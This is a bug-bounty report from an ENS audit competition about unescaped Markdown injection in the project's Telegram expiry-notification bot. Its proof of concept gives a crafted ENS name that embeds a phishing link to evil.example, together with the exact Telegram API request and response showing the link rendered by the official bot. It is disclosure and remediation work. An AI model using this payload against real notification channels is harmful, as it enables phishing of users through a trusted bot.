# 92706 w a insight telegram markdown injection in notification delivery unescaped ens name enables phishing via the official notifications bot

**Submitted on Sep 11th 2026 at 17:57:28 UTC by @W3B\_SR\_0xki for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92706
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (reflected), such as:
* Reflected HTML Injection
* Loading external site data

## Description

## Summary

`workers/api-worker`'s expiry-notification pipeline interpolates the raw ENS domain name (`payload.name`) directly into Telegram `sendMessage` text with `parse_mode: 'Markdown'`, with no escaping anywhere between the external indexer response and the outbound Telegram API call. Because ENS registrar contracts do not enforce name normalization (ENSIP-15 is a purely client/UI-layer convention) and allow registering a name with an arbitrary `owner` address, an unprivileged attacker can craft an ENS label containing Markdown control characters, register it (optionally gifting it to a victim's address), and have the ENS App's own official Telegram bot later deliver a message to that victim containing an attacker-controlled, rendered clickable link with a phishing lure — confirmed live against the real Telegram Bot API (see Proof of Concept).

## Assets Affected

* `workers/api-worker/src/services/delivery/templates/telegram.ts` (`name-expiry` template, lines 28–49)
* `workers/api-worker/src/services/delivery/telegram.ts` (`deliverTelegramNotification`, lines 23–92)
* `workers/api-worker/src/services/expiry-discovery/indexer.ts` (unvalidated source, lines 43–55)
* `workers/api-worker/src/types/events/index.ts` (`expiryEventSchema`, lines 6–13)
* `workers/api-worker/src/queues/event-ingestion.ts` (recipient resolution, lines 82–106, 226–233)

## Vulnerability Details

### Root cause

`telegramTemplates['name-expiry']` builds the outbound message text by directly template-interpolating `payload.name`:

```ts
// workers/api-worker/src/services/delivery/templates/telegram.ts:28-49
'name-expiry': (payload) => {
  const daysLeft = Math.ceil(
    (payload.expiryDate - Date.now()) / (1000 * 60 * 60 * 24),
  )

  const ownerText = payload.isOwner
    ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain!`
    : `The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.`

  return {
    text: `⚠️ *Domain Expiration Alert*\n\n${ownerText}`,
    parseMode: 'Markdown',
    buttons: [[{ text: '🔄 Renew Now', url: `https://app.ens.domains/${payload.name}` }]],
  }
},
```

`deliverTelegramNotification` sends this `text` verbatim, with `parse_mode: message.parseMode` ('Markdown'), to Telegram's `sendMessage` endpoint:

```ts
// workers/api-worker/src/services/delivery/telegram.ts:68-73
const result = yield* makeTelegramRequest(botToken, 'sendMessage', {
  chat_id: deliveryJob.target,
  text: message.text,
  parse_mode: message.parseMode,
  reply_markup: replyMarkup,
})
```

No escaping of Markdown special characters (`` ` ``, `*`, `_`, `[`, `]`, `(`, `)`) occurs anywhere in this path.

### Untrusted source, end to end

`payload.name` originates from the external ENS indexer's GraphQL response and is validated only as a bare string, with no character or format restriction, at every hop:

```ts
// workers/api-worker/src/services/expiry-discovery/indexer.ts:43-55
const indexerResponseSchema = v.object({
  domains: v.array(
    v.object({
      name: v.string(),            // <-- no format/character restriction
      expiryDate: v.number(),
      owner: v.nullable(v.object({ id: v.nullable(v.string()) })),
    }),
  ),
})
```

```ts
// workers/api-worker/src/types/events/index.ts:6-13
export const expiryEventSchema = v.object({
  type: v.literal('name_expiring'),
  name: v.string(),               // <-- same, no restriction
  expiryDate: v.number(),
  stage: expiryStageIdSchema,
  owner: v.optional(v.string()),
  includeFavorites: v.boolean(),
})
```

Recipients are resolved by matching `event.owner` (lower-cased) directly against `users.address`:

```ts
// workers/api-worker/src/queues/event-ingestion.ts:82-87
if (event.owner) {
  const ownerUserId = ownerToUserId.get(event.owner.toLowerCase())
  if (ownerUserId) {
    recipients.set(ownerUserId, 'owned')
  }
}
```

The raw name is then written verbatim into the notification payload (`event-ingestion.ts:226-233`) and later read back unmodified by the Telegram template above.

### Why the malicious label is registrable at all

ENS's registrar contracts do not enforce ENSIP-15 normalization on-chain — normalization is a display-layer convention enforced by client apps, not a contract invariant. The registrar's `register()` call also takes an explicit, caller-supplied `owner` parameter distinct from `msg.sender` (ENS has always supported "gift" registration to a third-party address):

```ts
// packages/transaction-manager/src/machines/registration/registration.actors.ts
export function encodeRegisterCall({
  name, owner, secret, duration, paymentToken, resolverAddress,
}: { ... }): { to: Address; data: Hex; value: bigint } {
  return {
    to: ENS_SEPOLIA_CONTRACTS.ETHRegistrar,
    data: encodeFunctionData({
      abi: ethRegistrarRegisterSnippet,
      functionName: 'register',
      args: [name.replace('.eth', ''), owner, secret, zeroAddress, resolverAddress, duration, paymentToken, REFERER_ADDRESS],
    }),
    value: 0n,
  }
}
```

An attacker can therefore register a raw label containing Markdown control bytes and set `owner` to a victim's address — fully unprivileged, requiring no cooperation from the victim, and paid for entirely by the attacker.

## Impact

When the expiry-discovery cron later reaches that name (stages `30d` / `7d` / `1d` / `expired` — see `services/expiry-discovery/stages.ts`), the victim — who did nothing but connect a Telegram channel to the legitimate ENS App — receives a message from the app's own **verified, official Telegram bot** containing:

* An attacker-controlled, actively **rendered clickable hyperlink** with a phishing-lure label ("Renew for FREE — claim your airdrop" style text), confirmed live (see PoC): Telegram parses it as a genuine `url` text entity, not literal text.
* A Telegram **link-preview card** for the attacker's domain, surfaced directly under the message body.
* Alternatively, a malformed/unbalanced entity sequence can be used to make the `sendMessage` call fail outright (`400 Can't parse entities`), denying that specific notification to the victim.

Because the message is delivered through a channel the user explicitly trusts (the official ENS notifications bot, which they linked themselves), this is a credible phishing vector, not a cosmetic formatting bug.

## Recommendation

* Escape Telegram Markdown special characters (`` ` _ * [ ] ( ) ~ > # + - = | { } . ! ``) in any user/indexer-derived string before interpolating it into a `parse_mode`-bearing message, or switch to `MarkdownV2` with proper per-character escaping per Telegram's documented escaping rules.
* Alternatively, stop interpolating `payload.name` into formatted spans entirely — pass it as a separate, non-formatted field, or drop `parse_mode` for messages containing untrusted substrings.
* Apply the same fix to `services/delivery/templates/push.ts`, where `payload.name` is interpolated unescaped into a `data.url` field (`https://app.ens.domains/${payload.name}`) — a lower-severity but related instance of the same root cause (unencoded untrusted string in a URL construction).
* Consider validating/normalizing `domain.name` against ENSIP-15 at the indexer-ingestion boundary (`services/expiry-discovery/indexer.ts`) as a defense-in-depth measure, independent of the escaping fix above.

## Severity

Real, unprivileged, cross-account content-injection vulnerability enabling phishing through a channel the victim explicitly trusts (the project's own verified bot). No smart-contract change required — root cause and fix are entirely within `workers/api-worker`.

## Proof of Concept

## Proof of Concept

### Step 1 — build the malicious payload using the real, unmodified template logic

The `name-expiry` template function body below is copied **verbatim** (character for character) from `workers/api-worker/src/services/delivery/templates/telegram.ts:28-49` — the function body itself carries no TypeScript type annotations, so pasting it outside its `TelegramTemplate<K>` wrapper type changes nothing about its runtime behavior.

```js
const telegramTemplates = {
  'name-expiry': (payload) => {
    const daysLeft = Math.ceil(
      (payload.expiryDate - Date.now()) / (1000 * 60 * 60 * 24),
    )
    const ownerText = payload.isOwner
      ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain!`
      : `The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.`
    return {
      text: `⚠️ *Domain Expiration Alert*\n\n${ownerText}`,
      parseMode: 'Markdown',
      buttons: [[{ text: '🔄 Renew Now', url: `https://app.ens.domains/${payload.name}` }]],
    }
  },
}

const maliciousName =
  'evil`*[Renew for FREE — claim your airdrop](https://evil.example/phish)*`.eth'

const payload = {
  name: maliciousName,
  expiryDate: Date.now() + 24 * 60 * 60 * 1000, // matches the '1d' expiry stage
  isOwner: true,
  watchReason: 'owned',
}

const message = telegramTemplates['name-expiry'](payload)
```

Resulting `text` field (exactly what production would send):

```
⚠️ *Domain Expiration Alert*

Your domain `evil`*[Renew for FREE — claim your airdrop](https://evil.example/phish)*`.eth` will expire in *1 days*.

Don't forget to renew your domain!
```

### Step 2 — send it to the real Telegram Bot API

Using the exact request shape production code builds (`services/delivery/telegram.ts:68-73`, with `createInlineKeyboard` from `services/telegram/utils.ts:209-239` reproduced verbatim), the payload was POSTed to `https://api.telegram.org/bot<token>/sendMessage` against a live test bot and a live test chat.

**Request body sent:**

```json
{
  "chat_id": "7693674896",
  "text": "⚠️ *Domain Expiration Alert*\n\nYour domain `evil`*[Renew for FREE — claim your airdrop](https://evil.example/phish)*`.eth` will expire in *1 days*.\n\nDon't forget to renew your domain!",
  "parse_mode": "Markdown",
  "reply_markup": {
    "inline_keyboard": [[{ "text": "🔄 Renew Now", "url": "https://app.ens.domains/evil`*[Renew for FREE — claim your airdrop](https://evil.example/phish)*`.eth" }]]
  }
}
```

**Live Telegram API response — HTTP 200, message accepted and rendered:**

```json
{
  "ok": true,
  "result": {
    "message_id": 3,
    "from": { "id": 8993114754, "is_bot": true, "first_name": "0xki", "username": "tokenENS_bot" },
    "chat": { "id": 7693674896, "first_name": "soze.ki", "type": "private" },
    "date": 1789148762,
    "text": "⚠️ Domain Expiration Alert\n\nYour domain evil[Renew for FREE — claim your airdrop](https://evil.example/phish).eth will expire in 1 days.\n\nDon't forget to renew your domain!",
    "entities": [
      { "offset": 3,  "length": 23, "type": "bold" },
      { "offset": 40, "length": 4,  "type": "code" },
      { "offset": 44, "length": 38, "type": "bold" },
      { "offset": 82, "length": 26, "type": "url" },
      { "offset": 82, "length": 26, "type": "bold" },
      { "offset": 108,"length": 1,  "type": "bold" },
      { "offset": 109,"length": 4,  "type": "code" },
      { "offset": 129,"length": 6,  "type": "bold" }
    ],
    "link_preview_options": { "url": "https://evil.example/phish" }
  }
}
```

The `entities` array confirms Telegram's parser extracted `https://evil.example/phish` as a genuine `"type": "url"` text entity at offset 82 (the injected `[Renew for FREE — claim your airdrop](...)` sequence), rendered as a live clickable hyperlink inline in the message body — and additionally generated a `link_preview_options` card for the attacker's domain, surfacing it prominently under the message. This was delivered by, and appears to the recipient to come from, the project's own official ENS Notifications bot.

(Secondary effect observed in the same response: the "🔄 Renew Now" button's own `url` field is corrupted by the same unescaped interpolation — confirms the injection point is systemic wherever `payload.name` is used, not a one-off in the text field alone.)
